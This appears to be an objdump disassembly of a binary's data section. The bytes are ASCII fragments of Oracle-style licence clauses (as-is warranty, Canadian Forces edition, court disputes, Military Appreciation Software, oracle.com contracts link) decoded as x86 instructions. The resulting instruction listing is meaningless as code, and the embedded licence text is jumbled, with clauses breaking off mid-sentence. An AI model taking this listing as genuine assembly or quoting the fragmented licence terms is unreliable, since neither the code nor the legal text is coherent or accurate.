  4367c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4367ca:	69 66 69 63 61 74 69 	imul   $0x69746163,0x69(%esi),%esp
  4367d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4367d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4367d3:	20 73 65             	and    %dh,0x65(%ebx)
  4367d6:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  4367da:	6e                   	outsb  %ds:(%esi),(%dx)
  4367db:	20 6f 66             	and    %ch,0x66(%edi)
  4367de:	20 74 68 69          	and    %dh,0x69(%eax,%ebp,2)
  4367e2:	73 20                	jae    0x436804
  4367e4:	61                   	popa
  4367e5:	67 72 65             	addr16 jb 0x43684d
  4367e8:	65 6d                	gs insl (%dx),%es:(%edi)
  4367ea:	65 6e                	outsb  %gs:(%esi),(%dx)
  4367ec:	74 2c                	je     0x43681a
  4367ee:	20 6f 72             	and    %ch,0x72(%edi)
  4367f1:	20 69 66             	and    %ch,0x66(%ecx)
  4367f4:	0a 74 68 65          	or     0x65(%eax,%ebp,2),%dh
  4367f8:	20 54 52 4d          	and    %dl,0x4d(%edx,%edx,2)
  4367fc:	73 2e                	jae    0x43682c
  4367fe:	20 54 52 4d          	and    %dl,0x4d(%edx,%edx,2)
  436802:	73 20                	jae    0x436824
  436804:	61                   	popa
  436805:	72 65                	jb     0x43686c
  436807:	20 70 72             	and    %dh,0x72(%eax)
  43680a:	6f                   	outsl  %ds:(%esi),(%dx)
  43680b:	76 69                	jbe    0x436876
  43680d:	64 65 64 20 74 6f 20 	fs gs and %dh,%fs:0x20(%edi,%ebp,2)
  436814:	79 6f                	jns    0x436885
  436816:	75 20                	jne    0x436838
  436818:	22 61 73             	and    0x73(%ecx),%ah
  43681b:	2d 69 73 22 20       	sub    $0x20227369,%eax
  436820:	77 69                	ja     0x43688b
  436822:	74 68                	je     0x43688c
  436824:	6f                   	outsl  %ds:(%esi),(%dx)
  436825:	75 74                	jne    0x43689b
  436827:	20 61 6e             	and    %ah,0x6e(%ecx)
  43682a:	79 20                	jns    0x43684c
  43682c:	77 61                	ja     0x43688f
  43682e:	72 72                	jb     0x4368a2
  436830:	61                   	popa
  436831:	6e                   	outsb  %ds:(%esi),(%dx)
  436832:	74 79                	je     0x4368ad
  436834:	20 6f 66             	and    %ch,0x66(%edi)
  436837:	20 61 6e             	and    %ah,0x6e(%ecx)
  43683a:	79 20                	jns    0x43685c
  43683c:	6b 69 6e 64          	imul   $0x64,0x6e(%ecx),%ebp
  436840:	2e 20 55 70          	and    %dl,%cs:0x70(%ebp)
  436844:	6f                   	outsl  %ds:(%esi),(%dx)
  436845:	6e                   	outsb  %ds:(%esi),(%dx)
  436846:	20 74 65 72          	and    %dh,0x72(%ebp,%eiz,2)
  43684a:	6d                   	insl   (%dx),%es:(%edi)
  43684b:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  436852:	2c 20                	sub    $0x20,%al
  436854:	79 6f                	jns    0x4368c5
  436856:	75 20                	jne    0x436878
  436858:	73 68                	jae    0x4368c2
  43685a:	61                   	popa
  43685b:	6c                   	insb   (%dx),%es:(%edi)
  43685c:	6c                   	insb   (%dx),%es:(%edi)
  43685d:	20 63 65             	and    %ah,0x65(%ebx)
  436860:	61                   	popa
  436861:	73 65                	jae    0x4368c8
  436863:	20 75 73             	and    %dh,0x73(%ebp)
  436866:	69 6e 67 2c 20 61 6e 	imul   $0x6e61202c,0x67(%esi),%ebp
  43686d:	64 0a 4b 2e          	or     %fs:0x2e(%ebx),%cl
  436871:	20 43 41             	and    %al,0x41(%ebx)
  436874:	20 4e 41             	and    %cl,0x41(%esi)
  436877:	20 44 49 41          	and    %al,0x41(%ecx,%ecx,2)
  43687b:	20 4e 20             	and    %cl,0x20(%esi)
  43687e:	46                   	inc    %esi
  43687f:	4f                   	dec    %edi
  436880:	52                   	push   %edx
  436881:	43                   	inc    %ebx
  436882:	45                   	inc    %ebp
  436883:	53                   	push   %ebx
  436884:	20 53 4f             	and    %dl,0x4f(%ebx)
  436887:	46                   	inc    %esi
  436888:	54                   	push   %esp
  436889:	57                   	push   %edi
  43688a:	41                   	inc    %ecx
  43688b:	20 52 45             	and    %dl,0x45(%edx)
  43688e:	0a 54 68 65          	or     0x65(%eax,%ebp,2),%dl
  436892:	20 43 61             	and    %al,0x61(%ebx)
  436895:	6e                   	outsb  %ds:(%esi),(%dx)
  436896:	61                   	popa
  436897:	64 69 61 6e 20 46 6f 	imul   $0x726f4620,%fs:0x6e(%ecx),%esp
  43689e:	72 
  43689f:	63 65 73             	arpl   %esp,0x73(%ebp)
  4368a2:	20 65 64             	and    %ah,0x64(%ebp)
  4368a5:	69 74 69 6f 6e 20 73 	imul   $0x6f73206e,0x6f(%ecx,%ebp,2),%esi
  4368ac:	6f 
  4368ad:	66 74 77             	data16 je 0x436927
  4368b0:	61                   	popa
  4368b1:	72 65                	jb     0x436918
  4368b3:	20 69 73             	and    %ch,0x73(%ecx)
  4368b6:	20 6e 6f             	and    %ch,0x6f(%esi)
  4368b9:	74 20                	je     0x4368db
  4368bb:	6c                   	insb   (%dx),%es:(%edi)
  4368bc:	69 63 65 6e 73 65 64 	imul   $0x6465736e,0x65(%ebx),%esp
  4368c3:	20 66 6f             	and    %ah,0x6f(%esi)
  4368c6:	72 20                	jb     0x4368e8
  4368c8:	75 73                	jne    0x43693d
  4368ca:	65 20 69 6e          	and    %ch,%gs:0x6e(%ecx)
  4368ce:	20 61 6e             	and    %ah,0x6e(%ecx)
  4368d1:	79 20                	jns    0x4368f3
  4368d3:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  4368d6:	6d                   	insl   (%dx),%es:(%edi)
  4368d7:	65 72 63             	gs jb  0x43693d
  4368da:	69 61 6c 2c 20 6e 6f 	imul   $0x6f6e202c,0x6c(%ecx),%esp
  4368e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4368e2:	2d 70 72 6f 66       	sub    $0x666f7270,%eax
  4368e7:	69 74 2c 20 6f 72 20 	imul   $0x7220726f,0x20(%esp,%ebp,1),%esi
  4368ee:	72 
  4368ef:	65 76 65             	gs jbe 0x436957
  4368f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4368f3:	75 65                	jne    0x43695a
  4368f5:	67 65 6e             	outsb  %gs:(%si),(%dx)
  4368f8:	65 72 61             	gs jb  0x43695c
  4368fb:	74 69                	je     0x436966
  4368fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4368fe:	67 20 61 63          	and    %ah,0x63(%bx,%di)
  436902:	74 69                	je     0x43696d
  436904:	76 69                	jbe    0x43696f
  436906:	74 69                	je     0x436971
  436908:	65 73 2e             	gs jae 0x436939
  43690b:	0a 61 63             	or     0x63(%ecx),%ah
  43690e:	63 65 73             	arpl   %esp,0x73(%ebp)
  436911:	73 20                	jae    0x436933
  436913:	74 68                	je     0x43697d
  436915:	65 20 70 72          	and    %dh,%gs:0x72(%eax)
  436919:	6f                   	outsl  %ds:(%esi),(%dx)
  43691a:	67 72 61             	addr16 jb 0x43697e
  43691d:	6d                   	insl   (%dx),%es:(%edi)
  43691e:	73 2e                	jae    0x43694e
  436920:	20 49 66             	and    %cl,0x66(%ecx)
  436923:	20 6d 75             	and    %ch,0x75(%ebp)
  436926:	6c                   	insb   (%dx),%es:(%edi)
  436927:	74 69                	je     0x436992
  436929:	70 6c                	jo     0x436997
  43692b:	65 78 69             	gs js  0x436997
  43692e:	6e                   	outsb  %ds:(%esi),(%dx)
  43692f:	67 20 68 61          	and    %ch,0x61(%bx,%si)
  436933:	72 64                	jb     0x436999
  436935:	77 61                	ja     0x436998
  436937:	72 65                	jb     0x43699e
  436939:	20 6f 72             	and    %ch,0x72(%edi)
  43693c:	20 73 6f             	and    %dh,0x6f(%ebx)
  43693f:	66 74 77             	data16 je 0x4369b9
  436942:	61                   	popa
  436943:	72 65                	jb     0x4369aa
  436945:	20 28                	and    %ch,(%eax)
  436947:	65 2e 67 2e 2c 20    	gs cs addr16 cs sub $0x20,%al
  43694d:	61                   	popa
  43694e:	20 54 50 20          	and    %dl,0x20(%eax,%edx,2)
  436952:	6d                   	insl   (%dx),%es:(%edi)
  436953:	6f                   	outsl  %ds:(%esi),(%dx)
  436954:	6e                   	outsb  %ds:(%esi),(%dx)
  436955:	69 74 6f 72 20 6f 72 	imul   $0x20726f20,0x72(%edi,%ebp,2),%esi
  43695c:	20 
  43695d:	61                   	popa
  43695e:	20 77 65             	and    %dh,0x65(%edi)
  436961:	62 20                	bound  %esp,(%eax)
  436963:	73 65                	jae    0x4369ca
  436965:	72 76                	jb     0x4369dd
  436967:	65 72 20             	gs jb  0x43698a
  43696a:	70 72                	jo     0x4369de
  43696c:	6f                   	outsl  %ds:(%esi),(%dx)
  43696d:	64 75 63             	fs jne 0x4369d3
  436970:	74 29                	je     0x43699b
  436972:	20 69 73             	and    %ch,0x73(%ecx)
  436975:	20 75 73             	and    %dh,0x73(%ebp)
  436978:	65 64 2c 20          	gs fs sub $0x20,%al
  43697c:	74 68                	je     0x4369e6
  43697e:	69 73 20 6e 75 6d 62 	imul   $0x626d756e,0x20(%ebx),%esi
  436985:	65 72 0a             	gs jb  0x436992
  436988:	41                   	inc    %ecx
  436989:	4c                   	dec    %esp
  43698a:	4c                   	dec    %esp
  43698b:	20 44 49 53          	and    %al,0x53(%ecx,%ecx,2)
  43698f:	50                   	push   %eax
  436990:	55                   	push   %ebp
  436991:	54                   	push   %esp
  436992:	45                   	inc    %ebp
  436993:	53                   	push   %ebx
  436994:	20 49 4e             	and    %cl,0x4e(%ecx)
  436997:	20 43 4f             	and    %al,0x4f(%ebx)
  43699a:	55                   	push   %ebp
  43699b:	52                   	push   %edx
  43699c:	54                   	push   %esp
  43699d:	20 42 45             	and    %al,0x45(%edx)
  4369a0:	46                   	inc    %esi
  4369a1:	4f                   	dec    %edi
  4369a2:	52                   	push   %edx
  4369a3:	45                   	inc    %ebp
  4369a4:	20 41 20             	and    %al,0x20(%ecx)
  4369a7:	4a                   	dec    %edx
  4369a8:	55                   	push   %ebp
  4369a9:	44                   	inc    %esp
  4369aa:	47                   	inc    %edi
  4369ab:	45                   	inc    %ebp
  4369ac:	20 4f 52             	and    %cl,0x52(%edi)
  4369af:	20 4a 55             	and    %cl,0x55(%edx)
  4369b2:	52                   	push   %edx
  4369b3:	59                   	pop    %ecx
  4369b4:	2e 20 49 6e          	and    %cl,%cs:0x6e(%ecx)
  4369b8:	73 74                	jae    0x436a2e
  4369ba:	65 61                	gs popa
  4369bc:	64 2c 20             	fs sub $0x20,%al
  4369bf:	61                   	popa
  4369c0:	6c                   	insb   (%dx),%es:(%edi)
  4369c1:	6c                   	insb   (%dx),%es:(%edi)
  4369c2:	20 64 69 73          	and    %ah,0x73(%ecx,%ebp,2)
  4369c6:	70 75                	jo     0x436a3d
  4369c8:	74 65                	je     0x436a2f
  4369ca:	73 20                	jae    0x4369ec
  4369cc:	77 69                	ja     0x436a37
  4369ce:	6c                   	insb   (%dx),%es:(%edi)
  4369cf:	6c                   	insb   (%dx),%es:(%edi)
  4369d0:	20 62 65             	and    %ah,0x65(%edx)
  4369d3:	20 72 65             	and    %dh,0x65(%edx)
  4369d6:	73 6f                	jae    0x436a47
  4369d8:	6c                   	insb   (%dx),%es:(%edi)
  4369d9:	76 65                	jbe    0x436a40
  4369db:	64 20 62 65          	and    %ah,%fs:0x65(%edx)
  4369df:	66 6f                	outsw  %ds:(%esi),(%dx)
  4369e1:	72 65                	jb     0x436a48
  4369e3:	0a 59 6f             	or     0x6f(%ecx),%bl
  4369e6:	75 20                	jne    0x436a08
  4369e8:	6d                   	insl   (%dx),%es:(%edi)
  4369e9:	61                   	popa
  4369ea:	79 20                	jns    0x436a0c
  4369ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4369ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4369ee:	74 20                	je     0x436a10
  4369f0:	65 78 63             	gs js  0x436a56
  4369f3:	65 65 64 20 74 68 65 	gs gs and %dh,%fs:0x65(%eax,%ebp,2)
  4369fa:	20 6c 69 63          	and    %ch,0x63(%ecx,%ebp,2)
  4369fe:	65 6e                	outsb  %gs:(%esi),(%dx)
  436a00:	73 65                	jae    0x436a67
  436a02:	64 20 6e 75          	and    %ch,%fs:0x75(%esi)
  436a06:	6d                   	insl   (%dx),%es:(%edi)
  436a07:	62 65 72             	bound  %esp,0x72(%ebp)
  436a0a:	20 6f 66             	and    %ch,0x66(%edi)
  436a0d:	20 65 78             	and    %ah,0x78(%ebp)
  436a10:	70 65                	jo     0x436a77
  436a12:	6e                   	outsb  %ds:(%esi),(%dx)
  436a13:	73 65                	jae    0x436a7a
  436a15:	20 72 65             	and    %dh,0x65(%edx)
  436a18:	70 6f                	jo     0x436a89
  436a1a:	72 74                	jb     0x436a90
  436a1c:	73 20                	jae    0x436a3e
  436a1e:	64 75 72             	fs jne 0x436a93
  436a21:	69 6e 67 20 61 6e 79 	imul   $0x796e6120,0x67(%esi),%ebp
  436a28:	20 31                	and    %dh,(%ecx)
  436a2a:	32 20                	xor    (%eax),%ah
  436a2c:	6d                   	insl   (%dx),%es:(%edi)
  436a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  436a2e:	6e                   	outsb  %ds:(%esi),(%dx)
  436a2f:	74 68                	je     0x436a99
  436a31:	20 70 65             	and    %dh,0x65(%eax)
  436a34:	72 69                	jb     0x436a9f
  436a36:	6f                   	outsl  %ds:(%esi),(%dx)
  436a37:	64 2e 0a 43 4f       	fs or  %cs:0x4f(%ebx),%al
  436a3c:	4d                   	dec    %ebp
  436a3d:	4d                   	dec    %ebp
  436a3e:	45                   	inc    %ebp
  436a3f:	52                   	push   %edx
  436a40:	43                   	inc    %ebx
  436a41:	49                   	dec    %ecx
  436a42:	41                   	inc    %ecx
  436a43:	4c                   	dec    %esp
  436a44:	4c                   	dec    %esp
  436a45:	59                   	pop    %ecx
  436a46:	20 52 45             	and    %dl,0x45(%edx)
  436a49:	41                   	inc    %ecx
  436a4a:	53                   	push   %ebx
  436a4b:	4f                   	dec    %edi
  436a4c:	4e                   	dec    %esi
  436a4d:	41                   	inc    %ecx
  436a4e:	42                   	inc    %edx
  436a4f:	4c                   	dec    %esp
  436a50:	45                   	inc    %ebp
  436a51:	20 4d 41             	and    %cl,0x41(%ebp)
  436a54:	4e                   	dec    %esi
  436a55:	4e                   	dec    %esi
  436a56:	45                   	inc    %ebp
  436a57:	52                   	push   %edx
  436a58:	2c 20                	sub    $0x20,%al
  436a5a:	59                   	pop    %ecx
  436a5b:	4f                   	dec    %edi
  436a5c:	55                   	push   %ebp
  436a5d:	20 4d 41             	and    %cl,0x41(%ebp)
  436a60:	59                   	pop    %ecx
  436a61:	20 45 4e             	and    %al,0x4e(%ebp)
  436a64:	44                   	inc    %esp
  436a65:	20 54 48 45          	and    %dl,0x45(%eax,%ecx,2)
  436a69:	20 52 45             	and    %dl,0x45(%edx)
  436a6c:	4c                   	dec    %esp
  436a6d:	45                   	inc    %ebp
  436a6e:	56                   	push   %esi
  436a6f:	41                   	inc    %ecx
  436a70:	4e                   	dec    %esi
  436a71:	54                   	push   %esp
  436a72:	20 53 45             	and    %dl,0x45(%ebx)
  436a75:	52                   	push   %edx
  436a76:	56                   	push   %esi
  436a77:	49                   	dec    %ecx
  436a78:	43                   	inc    %ebx
  436a79:	45                   	inc    %ebp
  436a7a:	53                   	push   %ebx
  436a7b:	20 41 4e             	and    %al,0x4e(%ecx)
  436a7e:	44                   	inc    %esp
  436a7f:	20 52 45             	and    %dl,0x45(%edx)
  436a82:	43                   	inc    %ebx
  436a83:	4f                   	dec    %edi
  436a84:	56                   	push   %esi
  436a85:	45                   	inc    %ebp
  436a86:	52                   	push   %edx
  436a87:	0a 4a 2e             	or     0x2e(%edx),%cl
  436a8a:	20 4d 49             	and    %cl,0x49(%ebp)
  436a8d:	4c                   	dec    %esp
  436a8e:	49                   	dec    %ecx
  436a8f:	54                   	push   %esp
  436a90:	41                   	inc    %ecx
  436a91:	52                   	push   %edx
  436a92:	59                   	pop    %ecx
  436a93:	20 41 50             	and    %al,0x50(%ecx)
  436a96:	50                   	push   %eax
  436a97:	52                   	push   %edx
  436a98:	45                   	inc    %ebp
  436a99:	43                   	inc    %ebx
  436a9a:	49                   	dec    %ecx
  436a9b:	41                   	inc    %ecx
  436a9c:	54                   	push   %esp
  436a9d:	49                   	dec    %ecx
  436a9e:	4f                   	dec    %edi
  436a9f:	4e                   	dec    %esi
  436aa0:	20 53 4f             	and    %dl,0x4f(%ebx)
  436aa3:	46                   	inc    %esi
  436aa4:	54                   	push   %esp
  436aa5:	57                   	push   %edi
  436aa6:	41                   	inc    %ecx
  436aa7:	20 52 45             	and    %dl,0x45(%edx)
  436aaa:	0a 54 65 63          	or     0x63(%ebp,%eiz,2),%dl
  436aae:	68 6e 69 63 61       	push   $0x6163696e
  436ab3:	6c                   	insb   (%dx),%es:(%edi)
  436ab4:	20 52 65             	and    %dl,0x65(%edx)
  436ab7:	66 65 72 65          	data16 gs jb 0x436b20
  436abb:	6e                   	outsb  %ds:(%esi),(%dx)
  436abc:	63 65 20             	arpl   %esp,0x20(%ebp)
  436abf:	4d                   	dec    %ebp
  436ac0:	61                   	popa
  436ac1:	6e                   	outsb  %ds:(%esi),(%dx)
  436ac2:	75 61                	jne    0x436b25
  436ac4:	6c                   	insb   (%dx),%es:(%edi)
  436ac5:	73 20                	jae    0x436ae7
  436ac7:	28 e2                	sub    %ah,%dl
  436ac9:	80 9c 54 52 4d 73 e2 	sbbb   $0x80,-0x1d8cb2ae(%esp,%edx,2)
  436ad0:	80 
  436ad1:	9d                   	popf
  436ad2:	29 20                	sub    %esp,(%eax)
  436ad4:	61                   	popa
  436ad5:	72 65                	jb     0x436b3c
  436ad7:	20 4f 72             	and    %cl,0x72(%edi)
  436ada:	61                   	popa
  436adb:	63 6c 65 e2          	arpl   %ebp,-0x1e(%ebp,%eiz,2)
  436adf:	80 99 73 20 63 6f 6e 	sbbb   $0x6e,0x6f632073(%ecx)
  436ae6:	66 69 64 65 6e 74 69 	imul   $0x6974,0x6e(%ebp,%eiz,2),%sp
  436aed:	61                   	popa
  436aee:	6c                   	insb   (%dx),%es:(%edi)
  436aef:	20 69 6e             	and    %ch,0x6e(%ecx)
  436af2:	66 6f                	outsw  %ds:(%esi),(%dx)
  436af4:	72 6d                	jb     0x436b63
  436af6:	61                   	popa
  436af7:	74 69                	je     0x436b62
  436af9:	6f                   	outsl  %ds:(%esi),(%dx)
  436afa:	6e                   	outsb  %ds:(%esi),(%dx)
  436afb:	2e 20 59 6f          	and    %bl,%cs:0x6f(%ecx)
  436aff:	75 20                	jne    0x436b21
  436b01:	73 68                	jae    0x436b6b
  436b03:	61                   	popa
  436b04:	6c                   	insb   (%dx),%es:(%edi)
  436b05:	6c                   	insb   (%dx),%es:(%edi)
  436b06:	20 75 73             	and    %dh,0x73(%ebp)
  436b09:	65 20 74 68 65       	and    %dh,%gs:0x65(%eax,%ebp,2)
  436b0e:	20 54 52 4d          	and    %dl,0x4d(%edx,%edx,2)
  436b12:	73 20                	jae    0x436b34
  436b14:	73 6f                	jae    0x436b85
  436b16:	6c                   	insb   (%dx),%es:(%edi)
  436b17:	65 6c                	gs insb (%dx),%es:(%edi)
  436b19:	79 20                	jns    0x436b3b
  436b1b:	66 6f                	outsw  %ds:(%esi),(%dx)
  436b1d:	72 20                	jb     0x436b3f
  436b1f:	79 6f                	jns    0x436b90
  436b21:	75 72                	jne    0x436b95
  436b23:	0a 66 6f             	or     0x6f(%esi),%ah
  436b26:	72 74                	jb     0x436b9c
  436b28:	68 20 69 6e 20       	push   $0x206e6920
  436b2d:	74 68                	je     0x436b97
  436b2f:	65 20 6f 72          	and    %ch,%gs:0x72(%edi)
  436b33:	64 65 72 20          	fs gs jb 0x436b57
  436b37:	61                   	popa
  436b38:	6e                   	outsb  %ds:(%esi),(%dx)
  436b39:	64 20 74 68 65       	and    %dh,%fs:0x65(%eax,%ebp,2)
  436b3e:	20 70 72             	and    %dh,0x72(%eax)
  436b41:	6f                   	outsl  %ds:(%esi),(%dx)
  436b42:	67 72 61             	addr16 jb 0x436ba6
  436b45:	6d                   	insl   (%dx),%es:(%edi)
  436b46:	20 64 6f 63          	and    %ah,0x63(%edi,%ebp,2)
  436b4a:	75 6d                	jne    0x436bb9
  436b4c:	65 6e                	outsb  %gs:(%esi),(%dx)
  436b4e:	74 61                	je     0x436bb1
  436b50:	74 69                	je     0x436bbb
  436b52:	6f                   	outsl  %ds:(%esi),(%dx)
  436b53:	6e                   	outsb  %ds:(%esi),(%dx)
  436b54:	2e 20 59 6f          	and    %bl,%cs:0x6f(%ecx)
  436b58:	75 20                	jne    0x436b7a
  436b5a:	6d                   	insl   (%dx),%es:(%edi)
  436b5b:	61                   	popa
  436b5c:	79 20                	jns    0x436b7e
  436b5e:	61                   	popa
  436b5f:	6c                   	insb   (%dx),%es:(%edi)
  436b60:	6c                   	insb   (%dx),%es:(%edi)
  436b61:	6f                   	outsl  %ds:(%esi),(%dx)
  436b62:	77 20                	ja     0x436b84
  436b64:	79 6f                	jns    0x436bd5
  436b66:	75 72                	jne    0x436bda
  436b68:	20 61 67             	and    %ah,0x67(%ecx)
  436b6b:	65 6e                	outsb  %gs:(%esi),(%dx)
  436b6d:	74 73                	je     0x436be2
  436b6f:	20 61 6e             	and    %ah,0x6e(%ecx)
  436b72:	64 20 63 6f          	and    %ah,%fs:0x6f(%ebx)
  436b76:	6e                   	outsb  %ds:(%esi),(%dx)
  436b77:	74 72                	je     0x436beb
  436b79:	61                   	popa
  436b7a:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  436b7e:	73 20                	jae    0x436ba0
  436b80:	74 6f                	je     0x436bf1
  436b82:	20 75 73             	and    %dh,0x73(%ebp)
  436b85:	65 20 74 68 65       	and    %dh,%gs:0x65(%eax,%ebp,2)
  436b8a:	20 70 72             	and    %dh,0x72(%eax)
  436b8d:	6f                   	outsl  %ds:(%esi),(%dx)
  436b8e:	67 72 61             	addr16 jb 0x436bf2
  436b91:	6d                   	insl   (%dx),%es:(%edi)
  436b92:	73 20                	jae    0x436bb4
  436b94:	66 6f                	outsw  %ds:(%esi),(%dx)
  436b96:	72 20                	jb     0x436bb8
  436b98:	74 68                	je     0x436c02
  436b9a:	69 73 0a 53 65 72 76 	imul   $0x76726553,0xa(%ebx),%esi
  436ba1:	65 72 20             	gs jb  0x436bc4
  436ba4:	28 53 74             	sub    %dl,0x74(%ebx)
  436ba7:	61                   	popa
  436ba8:	6e                   	outsb  %ds:(%esi),(%dx)
  436ba9:	64 61                	fs popa
  436bab:	72 64                	jb     0x436c11
  436bad:	20 45 64             	and    %al,0x64(%ebp)
  436bb0:	69 74 69 6f 6e 20 61 	imul   $0x6e61206e,0x6f(%ecx,%ebp,2),%esi
  436bb7:	6e 
  436bb8:	64 2f                	fs das
  436bba:	6f                   	outsl  %ds:(%esi),(%dx)
  436bbb:	72 20                	jb     0x436bdd
  436bbd:	45                   	inc    %ebp
  436bbe:	6e                   	outsb  %ds:(%esi),(%dx)
  436bbf:	74 65                	je     0x436c26
  436bc1:	72 70                	jb     0x436c33
  436bc3:	72 69                	jb     0x436c2e
  436bc5:	73 65                	jae    0x436c2c
  436bc7:	20 45 64             	and    %al,0x64(%ebp)
  436bca:	69 74 69 6f 6e 29 20 	imul   $0x6120296e,0x6f(%ecx,%ebp,2),%esi
  436bd1:	61 
  436bd2:	6e                   	outsb  %ds:(%esi),(%dx)
  436bd3:	64 20 74 68 65       	and    %dh,%fs:0x65(%eax,%ebp,2)
  436bd8:	20 6c 69 63          	and    %ch,0x63(%ecx,%ebp,2)
  436bdc:	65 6e                	outsb  %gs:(%esi),(%dx)
  436bde:	73 65                	jae    0x436c45
  436be0:	64 20 70 72          	and    %dh,%fs:0x72(%eax)
  436be4:	6f                   	outsl  %ds:(%esi),(%dx)
  436be5:	67 72 61             	addr16 jb 0x436c49
  436be8:	6d                   	insl   (%dx),%es:(%edi)
  436be9:	20 61 72             	and    %ah,0x72(%ecx)
  436bec:	65 20 72 75          	and    %dh,%gs:0x75(%edx)
  436bf0:	6e                   	outsb  %ds:(%esi),(%dx)
  436bf1:	6e                   	outsb  %ds:(%esi),(%dx)
  436bf2:	69 6e 67 20 61 72 65 	imul   $0x65726120,0x67(%esi),%ebp
  436bf9:	20 63 6f             	and    %ah,0x6f(%ebx)
  436bfc:	75 6e                	jne    0x436c6c
  436bfe:	74 65                	je     0x436c65
  436c00:	64 20 66 6f          	and    %ah,%fs:0x6f(%esi)
  436c04:	72 20                	jb     0x436c26
  436c06:	74 68                	je     0x436c70
  436c08:	65 20 70 75          	and    %dh,%gs:0x75(%eax)
  436c0c:	72 70                	jb     0x436c7e
  436c0e:	6f                   	outsl  %ds:(%esi),(%dx)
  436c0f:	73 65                	jae    0x436c76
  436c11:	20 6f 66             	and    %ch,0x66(%edi)
  436c14:	0a 74 65 6d          	or     0x6d(%ebp,%eiz,2),%dh
  436c18:	70 6c                	jo     0x436c86
  436c1a:	61                   	popa
  436c1b:	74 65                	je     0x436c82
  436c1d:	73 2c                	jae    0x436c4b
  436c1f:	20 63 6f             	and    %ah,0x6f(%ebx)
  436c22:	6f                   	outsl  %ds:(%esi),(%dx)
  436c23:	6b 69 65 73          	imul   $0x73,0x65(%ecx),%ebp
  436c27:	20 6d 61             	and    %ch,0x61(%ebp)
  436c2a:	79 20                	jns    0x436c4c
  436c2c:	62 65 20             	bound  %esp,0x20(%ebp)
  436c2f:	73 65                	jae    0x436c96
  436c31:	74 2e                	je     0x436c61
  436c33:	20 54 6f 20          	and    %dl,0x20(%edi,%ebp,2)
  436c37:	6c                   	insb   (%dx),%es:(%edi)
  436c38:	65 61                	gs popa
  436c3a:	72 6e                	jb     0x436caa
  436c3c:	20 68 6f             	and    %ch,0x6f(%eax)
  436c3f:	77 20                	ja     0x436c61
  436c41:	74 6f                	je     0x436cb2
  436c43:	20 62 6c             	and    %ah,0x6c(%edx)
  436c46:	6f                   	outsl  %ds:(%esi),(%dx)
  436c47:	63 6b 2c             	arpl   %ebp,0x2c(%ebx)
  436c4a:	20 63 6f             	and    %ah,0x6f(%ebx)
  436c4d:	6e                   	outsb  %ds:(%esi),(%dx)
  436c4e:	74 72                	je     0x436cc2
  436c50:	6f                   	outsl  %ds:(%esi),(%dx)
  436c51:	6c                   	insb   (%dx),%es:(%edi)
  436c52:	20 61 6e             	and    %ah,0x6e(%ecx)
  436c55:	64 20 64 65 6c       	and    %ah,%fs:0x6c(%ebp,%eiz,2)
  436c5a:	65 74 65             	gs je  0x436cc2
  436c5d:	20 63 6f             	and    %ah,0x6f(%ebx)
  436c60:	6f                   	outsl  %ds:(%esi),(%dx)
  436c61:	6b 69 65 73          	imul   $0x73,0x65(%ecx),%ebp
  436c65:	2c 20                	sub    $0x20,%al
  436c67:	70 6c                	jo     0x436cd5
  436c69:	65 61                	gs popa
  436c6b:	73 65                	jae    0x436cd2
  436c6d:	20 72 65             	and    %dh,0x65(%edx)
  436c70:	61                   	popa
  436c71:	64 20 74 68 65       	and    %dh,%fs:0x65(%eax,%ebp,2)
  436c76:	20 63 6f             	and    %ah,0x6f(%ebx)
  436c79:	6f                   	outsl  %ds:(%esi),(%dx)
  436c7a:	6b 69 65 73          	imul   $0x73,0x65(%ecx),%ebp
  436c7e:	0a 68 74             	or     0x74(%eax),%ch
  436c81:	74 70                	je     0x436cf3
  436c83:	3a 2f                	cmp    (%edi),%ch
  436c85:	2f                   	das
  436c86:	6f                   	outsl  %ds:(%esi),(%dx)
  436c87:	72 61                	jb     0x436cea
  436c89:	63 6c 65 2e          	arpl   %ebp,0x2e(%ebp,%eiz,2)
  436c8d:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  436c90:	2f                   	das
  436c91:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  436c94:	74 72                	je     0x436d08
  436c96:	61                   	popa
  436c97:	63 74 73 2c          	arpl   %esi,0x2c(%ebx,%esi,2)
  436c9b:	20 61 6e             	and    %ah,0x6e(%ecx)
  436c9e:	64 20 6d 61          	and    %ch,%fs:0x61(%ebp)
  436ca2:	79 20                	jns    0x436cc4
  436ca4:	62 65 20             	bound  %esp,0x20(%ebp)
  436ca7:	75 70                	jne    0x436d19
  436ca9:	64 61                	fs popa
  436cab:	74 65                	je     0x436d12
  436cad:	64 20 62 79          	and    %ah,%fs:0x79(%edx)
  436cb1:	20 4f 72             	and    %cl,0x72(%edi)
  436cb4:	61                   	popa
  436cb5:	63 6c 65 20          	arpl   %ebp,0x20(%ebp,%eiz,2)
  436cb9:	66 72 6f             	data16 jb 0x436d2b
  436cbc:	6d                   	insl   (%dx),%es:(%edi)
  436cbd:	20 74 69 6d          	and    %dh,0x6d(%ecx,%ebp,2)
  436cc1:	65 20 74 6f 20       	and    %dh,%gs:0x20(%edi,%ebp,2)
  436cc6:	74 69                	je     0x436d31
  436cc8:	6d                   	insl   (%dx),%es:(%edi)
  436cc9:	65 20 77 69          	and    %dh,%gs:0x69(%edi)
  436ccd:	74 68                	je     0x436d37
  436ccf:	6f                   	outsl  %ds:(%esi),(%dx)
  436cd0:	75 74                	jne    0x436d46
  436cd2:	20 6e 6f             	and    %ch,0x6f(%esi)
  436cd5:	74 69                	je     0x436d40
  436cd7:	63 65 20             	arpl   %esp,0x20(%ebp)
  436cda:	74 6f                	je     0x436d4b
  436cdc:	20 79 6f             	and    %bh,0x6f(%ecx)
  436cdf:	75 2e                	jne    0x436d0f
  436ce1:	0a ef                	or     %bh,%ch
